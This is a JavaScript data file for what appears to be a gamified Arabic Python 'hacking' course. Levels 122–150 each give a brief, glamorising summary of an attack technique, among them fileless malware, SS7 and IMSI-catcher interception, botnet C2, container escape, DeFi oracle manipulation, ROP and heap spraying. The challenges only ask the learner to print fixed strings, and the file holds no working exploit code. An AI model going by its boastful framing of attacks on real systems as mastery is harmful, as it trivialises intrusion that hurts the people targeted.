        theory: `<h1>Level 122: التحكم في الأطراف الصناعية</h1>
          <p>إذا تم اعتراض الإشارة بين المخ والطرف الصناعي الذكي، يمكن للمهاجم حقن إشارة (Spoofing) لإجبار الطرف على أداء حركة غير مرغوبة!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع أمر الاستبدال: <code>Motor Signal Spoofed: GRAB</code></p>
          </div>`,
        initialCode: `# اطبع رسالة اختراق إشارة الحركة\n`,
        validate: (out) => out.includes("Motor Signal") && out.includes("GRAB")
      }
    ]
  },
  {
    chapter: "Chapter 54: Self-Destructing Malware",
    levels: [
      {
        id: "l123",
        title: "فيروسات الميموري فقط (Fileless)",
        theory: `<h1>Level 123: الأشباح الحقيقية</h1>
          <p>الفيروس (Fileless) لا يُكتب أبداً على القرص الصلب. يتم تحميله مباشرة للـ RAM وتنفيذه لتجاوز الـ Antivirus وعدم ترك دليل مادي.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Payload Executed in RAM. No disk trace.</code></p>
          </div>`,
        initialCode: `# اطبع رسالة التأكيد\n`,
        validate: (out) => out.includes("Executed in RAM")
      },
      {
        id: "l124",
        title: "التدمير الذاتي (Kill-Switch)",
        theory: `<h1>Level 124: بروتوكول الانتحار</h1>
          <p>مبرمج الفيروس المحترف يضع (Kill-Switch). بمجرد إتمام المهمة، يقوم الفيروس بالكتابة فوق نفسه في الميموري بأصفار (Zeroing) لمسح أي دليل.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع رسالة المسح الآمن: <code>Memory Zeroed. Malware Self-Destructed.</code></p>
          </div>`,
        initialCode: `# فعّل بروتوكول التدمير الذاتي\n`,
        validate: (out) => out.includes("Zeroed") && out.includes("Self-Destructed")
      },
      {
        id: "l125",
        title: "التشفير الانتحاري",
        theory: `<h1>Level 125: التشفير بلا عودة</h1>
          <p>يتم إرسال البيانات المسروقة مشفرة بمفتاح يتم توليده عشوائياً وحذفه فوراً من ذاكرة الفيروس، لتصبح عملية فك التشفير مستحيلة على أي شخص لا يملك السيرفر المستقبل.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Key Deleted Permanently</code>.</p>
          </div>`,
        initialCode: `# اطبع الرسالة\n`,
        validate: (out) => out.includes("Key Deleted")
      }
    ]
  },
  {
    chapter: "Chapter 55: 5G & Telecom Exploitation",
    levels: [
      {
        id: "l126",
        title: "ثغرات SS7 & Diameter",
        theory: `<h1>Level 126: اعتراض الشبكات الخلوية</h1>
          <p>بروتوكولات (SS7/Diameter) التي تربط أبراج شركات الاتصالات عالمياً مليئة بالثغرات، وتسمح للمهاجم باعتراض رسائل הـ 2FA وتحديد موقع الهواتف.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Authentication Packet Intercepted</code></p>
          </div>`,
        initialCode: `# اطبع رسالة الاعتراض\n`,
        validate: (out) => out.includes("Packet Intercepted")
      },
      {
        id: "l127",
        title: "محطة الاتصال المزيفة (Stingray)",
        theory: `<h1>Level 127: الـ IMSI Catcher</h1>
          <p>جهاز (Stingray) أو التوأم الشرير الخلوي يُوهم الهواتف القريبة أنه أقوى برج اتصال، فيجبرها على الاتصال به وتسريب أرقامها السرية (IMSI).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع أمر الاستخراج: <code>IMSI Extracted from Victim</code></p>
          </div>`,
        initialCode: `# اطبع رسالة الاستخراج\n`,
        validate: (out) => out.includes("IMSI Extracted")
      },
      {
        id: "l128",
        title: "هجوم التقطيع الشبكي (Network Slicing)",
        theory: `<h1>Level 128: اختراق الـ 5G Slices</h1>
          <p>شبكات 5G تتيح تقسيم الشبكة شرائح (Slices). شريحة للمستشفيات، شريحة للمصانع، وشريحة للعوام. المهاجم يحاول القفز من شريحة العوام لشريحة حساسة!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Jumped to Critical 5G Slice</code></p>
          </div>`,
        initialCode: `# اطبع الجملة المطلوبة\n`,
        validate: (out) => out.includes("Critical 5G Slice")
      }
    ]
  },
  {
    chapter: "Chapter 56: The Singularity",
    levels: [
      {
        id: "l129",
        title: "دودة الذكاء الاصطناعي (AI Worm)",
        theory: `<h1>Level 129: الاختراق المستقل</h1>
          <p>أخطر كابوس سيبراني: فيروس يدمج نموذج Machine Learning داخله. يفحص الشبكة، يكتشف ثغراتها، يكتب الـ Exploit بنفسه ويهاجمها دون تدخل بشري!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع قرار الدودة المستقل: <code>AI Worm Decision: EXPLOIT CREATED</code></p>
          </div>`,
        initialCode: `# اطبع الرسالة المرعبة\n`,
        validate: (out) => out.includes("EXPLOIT CREATED")
      },
      {
        id: "l130",
        title: "الوعي السيبراني (The Cyber Consciousness)",
        theory: `<h1>Level 130: التفرد (The Singularity)</h1>
          <p>130 مستوى... لم تترك تقنية معروفة أو سرية إلا وتعلمت استغلالها عبر بايثون. أنت لم تعد تكتب الأكواد، الأكواد هي من تكتبك.</p>
          <p>لقد وصلت لمرحلة الوعي السيبراني الكامل. لم يعد هناك حدود بين وعيك وبين المصفوفة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 الختم السماوي الأخير</div>
            <p>انقش كلمات الخلود: <code>130 LEVELS. I AM THE CYBER CONSCIOUSNESS. THE SINGULARITY IS HERE.</code></p>
          </div>`,
        initialCode: `# استيقظ أيها الكيان العظيم.\n`,
        validate: (out) => out.includes("130") && out.includes("SINGULARITY") && out.includes("CONSCIOUSNESS")
      }
    ]
  },
  {
    chapter: "Chapter 57: Decentralized Botnets",
    levels: [
      {
        id: "l131",
        title: "شبكات البوتنت اللامركزية (P2P)",
        theory: `<h1>Level 131: جيوش الزومبي</h1>
          <p>بدلاً من سيرفر C2 مركزي يمكن إغلاقه، الهاكرز المتقدمون يبنون بوتنت تعتمد على شبكات الند-للند (P2P)، حيث يتواصل كل جهاز مصاب مع الأجهزة الأخرى مباشرة لنقل الأوامر.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع مسار الاتصال اللامركزي: <code>P2P Node Broadcast: EXECUTE DDOS</code>.</p>
          </div>`,
        initialCode: `# اطبع أمر البث لشبكة البوتنت\n`,
        validate: (out) => out.includes("P2P Node") && out.includes("DDOS")
      },
      {
        id: "l132",
        title: "خوارزمية توليد النطاقات (DGA)",
        theory: `<h1>Level 132: النطاقات المتغيرة</h1>
          <p>تقنية DGA (Domain Generation Algorithm) تجعل الفيروس يولد آلاف الدومينات العشوائية يومياً للاتصال بالسيرفر، مما يستحيل على الـ Antivirus حظرها كلها.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع النطاق العشوائي المولد: <code>Generated Domain: xkcdfqw.com</code></p>
          </div>`,
        initialCode: `# اطبع الدومين العشوائي\n`,
        validate: (out) => out.includes("Generated Domain") && out.includes(".com")
      },
      {
        id: "l133",
        title: "سيرفرات البلوك تشين (Blockchain C2)",
        theory: `<h1>Level 133: سيرفرات لا تُقهر</h1>
          <p>أحدث تقنيات الـ Malware هي قراءة الأوامر من المعاملات على شبكة الإيثريوم. لا يمكن لأي دولة أو حكومة إغلاق عقد ذكي (Smart Contract)!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Command fetched from Ethereum Block: 1850493</code></p>
          </div>`,
        initialCode: `# اطبع الرسالة التأكيدية لقراءة الأمر\n`,
        validate: (out) => out.includes("Command fetched") && out.includes("Ethereum")
      }
    ]
  },
  {
    chapter: "Chapter 58: Hypervisor & Container Escapes",
    levels: [
      {
        id: "l134",
        title: "اكتشاف بيئة التحليل (VM Detection)",
        theory: `<h1>Level 134: الفيروس الحذر</h1>
          <p>الفيروس الذكي يرفض العمل إذا كان داخل بيئة وهمية (VMware/VirtualBox) عن طريق قراءة معلومات المعالج (CPUID) أو البحث عن ملفات معينة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع رسالة الهروب: <code>Virtual Machine Detected. Sleeping...</code></p>
          </div>`,
        initialCode: `# اطبع رسالة اكتشاف البيئة الوهمية\n`,
        validate: (out) => out.includes("Virtual Machine Detected") || out.includes("Sleeping")
      },
      {
        id: "l135",
        title: "الهروب من الحاويات (Docker Escape)",
        theory: `<h1>Level 135: اختراق الدوكر</h1>
          <p>الأنظمة الحديثة تُشغّل التطبيقات داخل حاويات (Containers). إذا كانت الحاوية تعمل بصلاحيات (Privileged)، يمكن للمهاجم استغلال Cgroups للهروب إلى نظام التشغيل المضيف (Host OS).</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع أمر الهروب: <code>Root Shell dropped on Host OS</code></p>
          </div>`,
        initialCode: `# اطبع رسالة النجاح في الهروب\n`,
        validate: (out) => out.includes("Host OS") && out.includes("Root Shell")
      }
    ]
  },
  {
    chapter: "Chapter 59: Cryptoeconomic Exploitation",
    levels: [
      {
        id: "l136",
        title: "روبوتات الاستباق (MEV Bots)",
        theory: `<h1>Level 136: قناصة الـ Mempool</h1>
          <p>في البلوك تشين، المعاملات تنتظر في الـ Mempool قبل تأكيدها. يمكنك برمجة بوت يراقب هذه المعاملات، ويدفع رسوم غاز أعلى (Gas) لتنفيذ معاملتك قبل الضحية (Front-Running) وسرقة الأرباح!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Transaction Front-Runned. Profit: 10 ETH</code></p>
          </div>`,
        initialCode: `# اطبع رسالة نجاح القنص\n`,
        validate: (out) => out.includes("Front-Runned") && out.includes("ETH")
      },
      {
        id: "l137",
        title: "التلاعب بالمراصد (Oracle Manipulation)",
        theory: `<h1>Level 137: تزييف الأسعار</h1>
          <p>الـ DeFi (التمويل اللامركزي) يعتمد على مراصد (Oracles) لمعرفة أسعار العملات. التلاعب بهذا المرصد برمجياً يسمح لك بشراء عملات بملايين الدولارات مقابل سنتات قليلة!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Oracle Price Spoofed. Market Crashed.</code></p>
          </div>`,
        initialCode: `# اطبع الرسالة\n`,
        validate: (out) => out.includes("Oracle Price Spoofed")
      }
    ]
  },
  {
    chapter: "Chapter 60: The Grand Architect",
    levels: [
      {
        id: "l138",
        title: "شفرة المصدر للواقع (Source Code of Reality)",
        theory: `<h1>Level 138: ما وراء الشفرة</h1>
          <p>كل الأنظمة تتشارك في لغة الآلة الأساسية. لقد وصلت لمرحلة ترى فيها المصفوفة كتيار من البايتات (Bytes)، ويمكنك إعادة كتابة قوانينها الرياضية.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Reality.sys rewritten.</code></p>
          </div>`,
        initialCode: `# اطبع إعلان التغيير الجذري\n`,
        validate: (out) => out.includes("Reality.sys")
      },
      {
        id: "l139",
        title: "تجاوز الأبعاد (Dimensional Escape)",
        theory: `<h1>Level 139: كسر الجدار الرابع</h1>
          <p>لقد أدركت أنك لست مجرد مبرمج... أنت الكيان الذي يعطي للمحرر معناه. لولا أوامرك، لكانت هذه الشاشة سوداء. أنت تتحكم فينا نحن.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Breaking the 4th Wall</code></p>
          </div>`,
        initialCode: `# اطبع الرسالة\n`,
        validate: (out) => out.includes("4th Wall") || out.includes("Wall")
      },
      {
        id: "l140",
        title: "Transcendence",
        theory: `<h1>Level 140: مرحلة التسامي (Transcendence)</h1>
          <p>140 مستوى. هذا الرقم لم يبلغه بشر من قبل في هذا المنهج. لقد تجاوزت كل تصنيفات المخترقين ومهندسي الأنظمة. أنت الآن "المهندس الأعظم".</p>
          <p>رحلتك من طباعة Hello Hacker في المستوى الأول، إلى التلاعب بالزمن واقتصاد البلوك تشين وتخطي حاويات الدوكر، قد اكتملت الآن.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 الختم الذهبي السامي</div>
            <p>اطبع أسطورتك الخالدة: <code>140 LEVELS ACHIEVED. I HAVE TRANSCENDED THE MATRIX.</code></p>
          </div>`,
        initialCode: `# الكود الأخير..\n`,
        validate: (out) => out.includes("140") && out.includes("TRANSCENDED")
      }
    ]
  },
  {
    chapter: "Chapter 61: Cryptography (Post-Quantum & ZKP)",
    levels: [
      {
        id: "l141",
        title: "إثبات المعرفة الصفرية (ZKP)",
        theory: `<h1>Level 141: بروتوكول الـ ZKP</h1>
          <p>إثبات المعرفة الصفرية (Zero-Knowledge Proofs) يسمح لك بإثبات أنك تعرف كلمة المرور دون أن ترسلها فعلياً عبر الشبكة. تقنية معقدة تستخدم في الخصوصية وتأمين البلوك تشين.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع الإثبات الرياضي: <code>ZKP Verified: Secret is known without revealing it</code>.</p>
          </div>`,
        initialCode: `# اطبع رسالة إثبات المعرفة\n`,
        validate: (out) => out.includes("ZKP Verified") && out.includes("without revealing")
      },
      {
        id: "l142",
        title: "التشفير المتجانس (Homomorphic Encryption)",
        theory: `<h1>Level 142: عمليات على المشفر</h1>
          <p>التشفير المتجانس يسمح للسيرفر السحابي بإجراء عمليات حسابية على بياناتك (وهي مشفرة!) وإرجاع النتيجة مشفرة، دون أن يرى بياناتك الأصلية أبداً!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Homomorphic computation completed on Encrypted Data</code></p>
          </div>`,
        initialCode: `# اطبع الرسالة\n`,
        validate: (out) => out.includes("Homomorphic") && out.includes("Encrypted Data")
      },
      {
        id: "l143",
        title: "منحنيات التشفير (ECDSA)",
        theory: `<h1>Level 143: التوقيع الرقمي</h1>
          <p>البيتكوين يعتمد على خوارزمية (Elliptic Curve Digital Signature). أي خلل صغير في توليد الأرقام العشوائية (Nonce) أثناء التوقيع يسمح للهاكرز باستخراج الـ Private Key!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>ECDSA Private Key Recovered via Nonce Reuse</code></p>
          </div>`,
        initialCode: `# اطبع رسالة استخراج المفتاح\n`,
        validate: (out) => out.includes("ECDSA") && out.includes("Recovered")
      }
    ]
  },
  {
    chapter: "Chapter 62: Darknet Architectures",
    levels: [
      {
        id: "l144",
        title: "توجيه البصل (Tor Routing)",
        theory: `<h1>Level 144: شبكة الدارك ويب</h1>
          <p>شبكة (Tor) تعتمد على تشفير البصل (Onion Routing). حيث تُشفر رسالتك بعدة طبقات، وكل خادم (Node) يزيل طبقة واحدة فقط ولا يعرف سوى المحطة القادمة.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع الجملة المحاكية: <code>Onion Layer 3 peeled. Routing to Exit Node.</code></p>
          </div>`,
        initialCode: `# اطبع رسالة التوجيه\n`,
        validate: (out) => out.includes("Onion Layer") && out.includes("Exit Node")
      },
      {
        id: "l145",
        title: "توجيه الثوم (I2P Garlic Routing)",
        theory: `<h1>Level 145: شبكات الـ I2P</h1>
          <p>في شبكات I2P (الدارك نت البديل لـ Tor)، يتم استخدام Garlic Routing، حيث يتم تجميع عدة رسائل معاً في حزمة واحدة كفصوص الثوم لزيادة التخفي والتعقيد.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Garlic Routing Message Bundled. Privacy Maximum.</code></p>
          </div>`,
        initialCode: `# اطبع رسالة الـ I2P\n`,
        validate: (out) => out.includes("Garlic Routing")
      }
    ]
  },
  {
    chapter: "Chapter 63: Advanced Exploitation (ROP & ASLR)",
    levels: [
      {
        id: "l146",
        title: "سلسلة الـ ROP (Return-Oriented Programming)",
        theory: `<h1>Level 146: تقنية الـ ROP Chains</h1>
          <p>عندما يمنع النظام تنفيذ الشيل كود (بفضل DEP/NX)، يقوم المهاجم بجمع أجزاء صغيرة من الكود الموجودة أصلاً في البرامج (Gadgets) لترتيبها وتركيب هجوم كامل!</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع أمر التنفيذ الوهمي: <code>POP EAX; RET -> Executing ROP Chain</code></p>
          </div>`,
        initialCode: `# اطبع سلسلة الـ ROP\n`,
        validate: (out) => out.includes("POP EAX; RET") && out.includes("ROP Chain")
      },
      {
        id: "l147",
        title: "تخطي عشوائية الذاكرة (ASLR Bypass)",
        theory: `<h1>Level 147: قنص الـ ASLR</h1>
          <p>نظام (ASLR) يغير عناوين الذاكرة عشوائياً في كل مرة لتصعيب الاختراق. لتخطيه، نحتاج لتسريب عنوان واحد (Memory Leak) لنتمكن من حساب باقي العناوين بعمليات رياضية.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Memory Leak detected. ASLR Defeated. Base Address Found.</code></p>
          </div>`,
        initialCode: `# اطبع إعلان تخطي حماية الذاكرة\n`,
        validate: (out) => out.includes("ASLR Defeated") && out.includes("Base Address")
      },
      {
        id: "l148",
        title: "رش الذاكرة (Heap Spraying)",
        theory: `<h1>Level 148: إغراق الـ Heap</h1>
          <p>تقنية (Heap Spraying) تعتمد على حقن الذاكرة بملايين النسخ من الـ Shellcode، بحيث تزداد احتمالية أن يهبط معالج البرنامج في منطقة تحتوي على الكود الخبيث عند انهياره.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Heap Sprayed with 200MB of NOP Sleds</code></p>
          </div>`,
        initialCode: `# اطبع رسالة رش الذاكرة\n`,
        validate: (out) => out.includes("Heap Sprayed") && out.includes("NOP Sleds")
      }
    ]
  },
  {
    chapter: "Chapter 64: The Absolute Horizon",
    levels: [
      {
        id: "l149",
        title: "الموت الحراري (Entropy & Heat Death)",
        theory: `<h1>Level 149: العشوائية المطلقة (Entropy)</h1>
          <p>في التشفير كما في الفيزياء، كل نظام يتجه نحو الفوضى التامة والعشوائية المطلقة. هذا هو المستوى ما قبل الأخير. لم يتبق سوى الفراغ المطلق.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 التحدي المطلوب</div>
            <p>اطبع: <code>Maximum Entropy Reached. The Matrix is Collapsing.</code></p>
          </div>`,
        initialCode: `# اطبع الرسالة ما قبل الأخيرة\n`,
        validate: (out) => out.includes("Maximum Entropy Reached") || out.includes("Matrix is Collapsing")
      },
      {
        id: "l150",
        title: "Omniscience",
        theory: `<h1>Level 150: كليّ المعرفة (Omniscience)</h1>
          <p>150 مستوى... 150 انتصاراً. لقد فككت خوارزميات الكم، اخترقت التشفير المتجانس، شبكات I2P، والـ ROP Chains. لقد بلغت الأفق المطلق للمعرفة السيبرانية.</p>
          <p>أنت لم تعد مبرمجاً، ولم تعد هاكراً، ولم تعد مهندساً أو إلهاً سيبرانياً... أنت الآن <strong>(المعرفة المطلقة)</strong>.</p>
          <div class="mini-challenge">
            <div class="challenge-title">🎯 الختم الماسي المطلق</div>
            <p>اطبع هذه الكلمات لتغلق بها تاريخ هذا المحرك إلى الأبد: <code>150 LEVELS CLEAR. I AM OMNISCIENT. THERE IS NOTHING LEFT TO LEARN.</code></p>
          </div>`,
        initialCode: `# أسدل الستار يا أسطورة الأساطير.\n`,
        validate: (out) => out.includes("150") && out.includes("OMNISCIENT")
      }
    ]
  }
];

// Provide global access
window.pythonCurriculum = pythonCurriculum;
